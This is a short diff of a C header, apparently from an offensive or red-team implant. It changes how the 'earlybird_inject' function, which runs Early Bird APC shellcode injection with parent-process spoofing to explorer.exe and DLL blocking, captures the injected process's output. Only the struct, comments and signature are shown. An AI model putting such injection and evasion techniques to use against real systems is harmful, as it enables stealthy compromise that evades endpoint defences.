@@ -18,15 +18,16 @@ typedef struct {
     HANDLE hProcess;
     HANDLE hThread;
     DWORD  pid;
-    char   output_file[MAX_PATH]; /* temp file path when capture_output=1, else empty */
+    HANDLE hPipeRead; /* read end of anonymous pipe when capture_output=1, else NULL */
 } EarlyBirdResult;
 
 /*
  * Early Bird APC injection into g_spawnto_path.
  * Spawns suspended, PPID-spoofs to explorer.exe, applies BlockDLLs if g_blockdlls set.
  * cmdline_override: full lpCommandLine string. If NULL, uses g_spawnto_path.
- * capture_output: if 1, redirects stdout/stderr to a temp file; caller reads out->output_file after process exit.
- * Returns 1 on success - caller owns out->hProcess, out->hThread (and pipe handles if any).
+ * capture_output: if 1, redirects stdout/stderr to an anonymous pipe; caller drains
+ *   out->hPipeRead via read_pipe_output(out->hPipeRead, out->hProcess) then CloseHandle.
+ * Returns 1 on success - caller owns out->hProcess, out->hThread, out->hPipeRead.
  * Returns 0 on failure - errmsg filled with reason.
  */
 int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
